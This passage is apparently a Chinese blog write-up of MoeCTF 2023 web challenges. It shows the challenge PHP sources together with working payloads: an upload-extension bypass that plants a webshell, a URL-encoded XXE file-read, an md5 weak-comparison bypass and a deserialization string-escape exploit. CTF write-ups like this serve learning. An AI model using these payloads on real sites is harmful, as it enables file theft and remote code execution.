class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过源码发现，只允许上传png图片，并且以.为分隔，拿到文件后缀并判断，但是只判断第一个.后面的内容，此时我们就可以在后面通过burp加上.php上传木马，然后进入后门：</p><p><img src="/2023/10/10/moectf2023-web/6-1.png"></p><h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><p><img src="/2023/10/10/moectf2023-web/7-1.png"></p><p>提示flag在根目录，burp抓包后发现xml_content，之前不知道xml是什么，搜索了一下，XML（Extensible Markup Language）是一种类似于 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTML">HTML</a>，但是没有使用预定义标记的语言。因此，可以根据自己的设计需求定义专属的标记。这是一种强大将数据存储在一个可以存储、搜索和共享的格式中的方法。最重要的是，因为 XML 的基本格式是标准化的，如果你在本地或互联网上跨系统或平台共享或传输 XML，由于标准化的 XML 语法，接收者仍然可以解析数据。</p><p>也就是xml和html差不多，用来传输文档元数据，这里我们要读取flag文件，大概率就是xxe漏洞：</p><p>1、内部实体声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE books [</span><br><span class="line">&lt;!ENTITY xxe &quot;Hello World&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;books&gt;&amp;xxe;&lt;/books&gt;</span><br></pre></td></tr></table></figure><p>2、外部实体声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE books [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;URL&quot;&gt;#这里添加一个SYSTEM是为了让xml解析器知道这是外部实体，从而解析到外部实体的内容</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;books&gt;&amp;xxe;&lt;/books&gt;</span><br></pre></td></tr></table></figure><p>这样就可以利用xxe外部实体漏洞实现任意文件读取了，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20xxe%20%5b%3c!ENTITY%20xxe%20SYSTEM%20%22%2f%2f%2fflag%22%3e%5d%3e%3cxml%3e%3cname%3e%26xxe%3b%3c%2fname%3e%3c%2fxml%3e</span><br></pre></td></tr></table></figure><p><img src="/2023/10/10/moectf2023-web/7-2.png"></p><h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p>提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use /?id=&lt;1-1000&gt; to connect to different parallel universes</span><br></pre></td></tr></table></figure><p>直接爆破即可：</p><p><img src="/2023/10/10/moectf2023-web/8-1.png"></p><h2 id="moe图床-1"><a href="#moe图床-1" class="headerlink" title="moe图床"></a>moe图床</h2><p>F12发现只允许上传jpeg,png,gif图片，访问uplaod.php没有回显，随便上传一个文件，查看，发现url变成了url&#x2F;images.php?name&#x3D;xxxxx.xxx，这里猜测是任意文件读取，因为这个图片大概率是通过name读出来的</p><p><img src="/2023/10/10/moectf2023-web/9-1.png"></p><p>可惜不是任意文件读取，提示Fl3g_n0t_Here_dont_peek!!!!!.php，访问它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$md5Param1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>);</span><br><span class="line">        <span class="variable">$md5Param2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$md5Param1</span> == <span class="variable">$md5Param2</span>) &#123;<span class="comment">//md5弱比较</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.O!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.o??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;O.o?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> O.o?</span><br></pre></td></tr></table></figure><p>很简单，直接弱比较绕过就行，md5值都为0，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param1=QLTHNDT&amp;param2=QNKCDZO</span><br></pre></td></tr></table></figure><h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Your Movements: O:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;夺命十三枪&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br><span class="line">Far away <span class="keyword">from</span> COOL...</span><br></pre></td></tr></table></figure><p>查看包含文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>外部文件作用是接收传入的值，然后将其传入内部文件，若内部文件处理后的值可以被反序列化，则输出反序列化结果否则输出Even Caused A Glitch…，所以关键在于内部文件，通过分析代码，当<code>Spear_Owner = &#39;MaoLei&#39;</code>时才会输入flag，第一个类中出现了危险函数<code>str_replace</code>，这时候就想到了字符逃逸，我们传入的chant需要将<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>逃逸，<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>一共35个字符，在第一个类中，<code>&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;</code>替换后，可以顶出5个字符，也就是可以逃逸5个字符，那么需要7个<code>di_qi_qiang</code>就能实现逃逸，payload：<code>?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><p><img src="/2023/10/10/moectf2023-web/10-1.png"></p><p>这里又学习了一下反序列化字符串逃逸：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;bob&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$sa</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sa</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#$d=preg_replace(&#x27;/o/&#x27;,&#x27;oo&#x27;,$sa);</span></span><br><span class="line"><span class="comment">#echo &quot;&lt;br&gt;$d&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$d</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;name&quot;;s:50:&quot;boooooooooooooooooooooooob&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#echo strlen(&#x27;&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;&#x27;);</span></span><br><span class="line"><span class="variable">$dd</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/o/&#x27;</span>,<span class="string">&#x27;oo&#x27;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$usdd</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$dd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dd</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$usdd</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串逃逸</span></span><br><span class="line"><span class="comment">//字符增加情况：上面的例子中字符串boooooooooooooooooooooooob&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;长度为50,由于$dd=preg_replace(&#x27;/o/&#x27;,&#x27;oo&#x27;,$d)将o变为oo，这样将&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;顶了出去，由于;&#125;闭合了反序列化，这样后面的;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;将被舍弃，这样就形成字符逃逸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符减少情况：如果遇到过滤，将某一字符直接删除，那么就直接是值的替换，如：</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;name&quot;;s:28:&quot;flagflagflagflagflagflagflag&quot;;s:3:&quot;pwd&quot;;s:6:&quot;12345678&quot;;&#125;&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//&quot;;s:3:&quot;pwd&quot;;s:4:&quot;12345678&quot;;&#125;长度为28直接替换name的值，;&#125;闭合，实现字符逃逸</span></span><br><span class="line"><span class="variable">$cc</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/flag/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$uscc</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cc</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uscc</span>);</span><br></pre></td></tr></table></figure><h2 id="sigin"><a href="#sigin" class="headerlink" title="sigin"></a>sigin</h2><p>下载附件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> users, salt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> http.server</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethash</span>(<span class="params">*items</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span 